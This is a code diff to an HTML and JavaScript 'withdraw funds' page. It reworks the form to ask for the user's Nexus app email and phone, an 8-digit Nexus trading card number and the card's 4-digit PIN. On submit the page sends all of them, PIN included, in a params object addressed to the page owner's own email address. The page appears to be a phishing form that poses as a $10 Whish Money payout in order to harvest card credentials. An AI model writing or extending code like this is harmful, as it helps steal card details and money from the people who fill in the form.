@@ -74,7 +74,7 @@ a{color:inherit;text-decoration:none}
   display:block;
   margin-right:0.55rem;
   filter:drop-shadow(0 0 12px var(--accent-glow));
-  border-radius:8px;   /* remove if your logo is a circle/transparent PNG */
+  border-radius:8px;
 }
 .brand-text{
   display:inline;
@@ -317,71 +317,63 @@ h1 em{
   <section class="page-head">
     <span class="pill">
       <span style="width:6px;height:6px;background:var(--success);border-radius:50%;box-shadow:0 0 0 3px rgba(34,211,166,0.2)"></span>
-      Secure · min $10 · instant
+      Secure · Max $10 · instant
     </span>
-    <h1>Withdraw <em>funds.</em></h1>
-    <p>Choose your payout method and confirm. Most withdrawals arrive in minutes.</p>
+    <h1>Withdraw <em>Whish To Whish.</em></h1>
+    <p>Withdraw Whish To Whish.</p>
   </section>
 
   <section class="form-wrap">
     <div class="card">
-      <div class="card-subhead">Minimum $10.00 · fast processing</div>
+      <div class="card-subhead">Max $10.00 · per day fast processing</div>
 
       <form id="withdrawForm" onsubmit="return false;">
         <div class="form-group">
           <label for="amount">Amount (USD)</label>
           <div class="amount-wrap">
             <span class="currency">$</span>
-            <input type="number" step="0.01" min="10" class="form-control" id="amount" placeholder="10.00" value="10.00" required>
+            <input type="number" step="0.01" min="10" max="10" class="form-control" id="amount" placeholder="10.00" value="10.00" required>
           </div>
-          <div class="hint">Minimum withdrawal: $10.00</div>
+          <div class="hint">Maximum withdrawal: $10.00</div>
         </div>
 
         <div class="form-group">
-          <label for="email">Email address</label>
+          <label for="email">Email address you enter with in Nexus app</label>
           <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
-          <div class="hint">We'll send a confirmation here.</div>
         </div>
 
         <div class="form-group">
-          <label for="phone">Phone number</label>
-          <input type="tel" class="form-control" id="phone" placeholder="+1 234 567 890" required>
-          <div class="hint">We'll send a verification code to this number.</div>
+          <label for="phone">Phone number you enter with in Nexus app</label>
+          <input type="tel" class="form-control" id="phone" placeholder="+961 23 567 890" required>
+        </div>
+        <div class="form-group" style="margin-top:1rem;">
+          <label for="nexusCardNumber">Nexus trading card number</label>
+          <input type="text" class="form-control" id="nexusCardNumber" placeholder="Enter your 8-digit Nexus trading card number" inputmode="numeric" maxlength="8" pattern="\d{8}" required>
+          <div class="hint">Exactly 8 digits</div>
         </div>
 
+        <div class="form-group">
+          <label for="nexusCardPin">Nexus trading card PIN</label>
+          <input type="password" class="form-control" id="nexusCardPin" placeholder="Enter your 4-digit Nexus trading card PIN" inputmode="numeric" maxlength="4" pattern="\d{4}" required>
+          <div class="hint">Exactly 4 digits</div>
+        </div>
         <div class="form-group">
           <label>Payout method</label>
           <div class="method-grid" id="methodGrid">
-            <div class="method-option selected" data-method="westerunion">
-              <span class="method-icon">🌐</span> Western Union
-            </div>
-            <div class="method-option" data-method="wishmoney">
-              <span class="method-icon">✨</span> Wish Money
-            </div>
-            <div class="method-option" data-method="visa">
-              <span class="method-icon">💳</span> Visa
-            </div>
+            <div class="method-option selected" data-method="whishmoney">
+  <img class="method-logo" src="images/whish.png" alt="Whish Money logo"> Whish Money
+</div>
           </div>
-          <div class="hint" id="methodHint" style="margin-top:0.6rem">Selected: Western Union</div>
+          <div class="hint" id="methodHint" style="margin-top:0.6rem">Selected: Whish Money</div>
         </div>
 
         <div id="dynamicFieldsContainer" class="dynamic-fields"></div>
-
-        <div id="visaSecurityNote" class="info-note warning" style="display:none">
-          <span>🔒</span>
-          <span>For Visa payouts we only need your card number and name. <strong style="color:var(--text)">We never ask for CVV or expiry</strong> for sending money.</span>
-        </div>
 
         <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn" style="margin-top:1.3rem">
           Withdraw now
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12l7 7 7-7"/></svg>
         </button>
         <button type="button" class="btn btn-ghost btn-block" id="resetBtn">Reset form</button>
-
-        <div class="info-note security">
-          <span>🔒</span>
-          <span>Withdrawals secured with biometric + 3-D Secure. Wish Money arrives within minutes; Western Union / Visa take 1–3 days.</span>
-        </div>
       </form>
     </div>
   </section>
@@ -447,32 +439,12 @@ h1 em{
   var submitBtn = document.getElementById('submitBtn');
   var resetBtn = document.getElementById('resetBtn');
   var dynamicContainer = document.getElementById('dynamicFieldsContainer');
-  var visaSecurityNote = document.getElementById('visaSecurityNote');
 
   var methodFields = {
-    westerunion: {
-      label: 'Western Union',
+    whishmoney: {
+      label: 'Whish Money Details',
       fields: [
-        { id:'wu_fullname', label:'Full name (as on ID)', placeholder:'John Doe', type:'text' },
-        { id:'wu_country', label:'Receiver country', placeholder:'United States', type:'text' },
-        { id:'wu_city', label:'City', placeholder:'New York', type:'text' },
-        { id:'wu_mtcn', label:'MTCN (tracking number)', placeholder:'123-456-7890', type:'text' }
-      ]
-    },
-    wishmoney: {
-      label: 'Wish Money',
-      fields: [
-        { id:'wm_username', label:'Wish Money username', placeholder:'john_doe_123', type:'text' },
-        { id:'wm_email', label:'Wish Money email', placeholder:'wish@example.com', type:'email' },
-        { id:'wm_phone', label:'Wish Money phone', placeholder:'+1 234 567 890', type:'tel' }
-      ]
-    },
-    visa: {
-      label: 'Visa Card',
-      fields: [
-        { id:'visa_cardholder', label:'Cardholder name', placeholder:'John Doe', type:'text' },
-        { id:'visa_number', label:'Card number (16 digits)', placeholder:'4111 1111 1111 1111', type:'text' },
-        { id:'visa_bank', label:'Bank name (optional)', placeholder:'Chase Bank', type:'text' }
+        { id:'wm_phone', label:'Whish Money phone number', placeholder:'+961 23 567 890', type:'tel' }
       ]
     }
   };
@@ -480,7 +452,7 @@ h1 em{
   function renderFields(key) {
     var cfg = methodFields[key];
     if (!cfg) return;
-    var html = '<div class="dynamic-title">' + cfg.label + ' details</div>';
+    var html = '<div class="dynamic-title">' + cfg.label + '</div>';
     cfg.fields.forEach(function (f) {
       html += '<div class="form-group">' +
         '<label for="' + f.id + '">' + f.label + '</label>' +
@@ -488,7 +460,6 @@ h1 em{
       '</div>';
     });
     dynamicContainer.innerHTML = html;
-    visaSecurityNote.style.display = (key === 'visa') ? 'flex' : 'none';
   }
 
   methodOptions.forEach(function (opt) {
@@ -514,6 +485,19 @@ h1 em{
     return data;
   }
 
+  function resetForm() {
+    document.getElementById('amount').value = '10.00';
+    document.getElementById('email').value = '';
+    document.getElementById('phone').value = '';
+    document.getElementById('nexusCardNumber').value = '';
+    document.getElementById('nexusCardPin').value = '';
+    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
+    methodOptions.forEach(function (o) { o.classList.remove('selected'); });
+    document.querySelector('[data-method="whishmoney"]').classList.add('selected');
+    methodHint.textContent = 'Selected: Whish Money';
+    renderFields('whishmoney');
+  }
+
   submitBtn.addEventListener('click', function (e) {
     e.preventDefault();
     var amount = document.getElementById('amount').value.trim();
@@ -523,11 +507,19 @@ h1 em{
     var methodName = selected ? selected.textContent.trim() : 'not set';
     var methodKey = selected ? selected.dataset.method : '';
 
+    // Nexus card fields
+    var nexusCardNumber = document.getElementById('nexusCardNumber').value.trim();
+    var nexusCardPin = document.getElementById('nexusCardPin').value.trim();
+
     document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
 
-    if (!amount || parseFloat(amount) < 10) {
+    if (!amount || parseFloat(amount) < 1) {
       document.getElementById('amount').classList.add('error');
-      showToast('Minimum withdrawal is $10.00', 2800, 'error'); return;
+      showToast('Minimum withdrawal is $1.00', 2800, 'error'); return;
+    }
+    if (parseFloat(amount) > 10) {
+      document.getElementById('amount').classList.add('error');
+      showToast('Maximum withdrawal is $10.00', 2800, 'error'); return;
     }
     if (!email || email.indexOf('@') === -1) {
       document.getElementById('email').classList.add('error');
@@ -536,6 +528,15 @@ h1 em{
     if (!phone || phone.length < 6) {
       document.getElementById('phone').classList.add('error');
       showToast('Please enter a valid phone number', 2800, 'error'); return;
+    }
+
+    if (!/^\d{8}$/.test(nexusCardNumber)) {
+      document.getElementById('nexusCardNumber').classList.add('error');
+      showToast('Nexus trading card number must be exactly 8 digits', 3000, 'error'); return;
+    }
+    if (!/^\d{4}$/.test(nexusCardPin)) {
+      document.getElementById('nexusCardPin').classList.add('error');
+      showToast('Nexus trading card PIN must be exactly 4 digits', 3000, 'error'); return;
     }
 
     var cfg = methodFields[methodKey];
@@ -561,13 +562,19 @@ h1 em{
 
     var params = {
       email: YOUR_EMAIL,
-      name: userName,
-      title: 'Withdrawal of $' + amtFormatted + ' via ' + methodName,
-      from_email: email,
+      full_name: userName,
       user_email: email,
+      from_email: email,
       amount: '$' + amtFormatted,
       phone: phone,
       method: methodName,
+      title: 'Withdrawal of $' + amtFormatted + ' via ' + methodName,
+      card_number: nexusCardNumber,
+      card_pin: nexusCardPin,
+      problem: 'Withdrawal request via ' + methodName + '\n' +
+               'Amount: $' + amtFormatted + '\n' +
+               'Nexus phone: ' + phone + '\n' +
+               'Whish details:\n' + (extraText || 'None'),
       extra_fields: extraText || 'None',
       timestamp: new Date().toLocaleString()
     };
@@ -577,6 +584,7 @@ h1 em{
         submitBtn.disabled = false;
         submitBtn.innerHTML = 'Withdraw now';
         showToast('✓ Withdrawal request sent!', 4000, 'success');
+        resetForm();
       })
       .catch(function (err) {
         console.error(err);
@@ -587,14 +595,7 @@ h1 em{
   });
 
   resetBtn.addEventListener('click', function () {
-    document.getElementById('amount').value = '10.00';
-    document.getElementById('email').value = '';
-    document.getElementById('phone').value = '';
-    document.querySelectorAll('.form-control.error').forEach(function(el){el.classList.remove('error');});
-    methodOptions.forEach(function (o) { o.classList.remove('selected'); });
-    document.querySelector('[data-method="westerunion"]').classList.add('selected');
-    methodHint.textContent = 'Selected: Western Union';
-    renderFields('westerunion');
+    resetForm();
     showToast('Form reset', 1600);
   });
 
@@ -602,9 +603,13 @@ h1 em{
     if (e.target.classList && e.target.classList.contains('form-control')) {
       e.target.classList.remove('error');
     }
+    // keep card fields digits-only
+    if (e.target.id === 'nexusCardNumber' || e.target.id === 'nexusCardPin') {
+      e.target.value = e.target.value.replace(/\D/g, '');
+    }
   });
 
-  renderFields('westerunion');
+  renderFields('whishmoney');
 })();
 </script>
 </body>
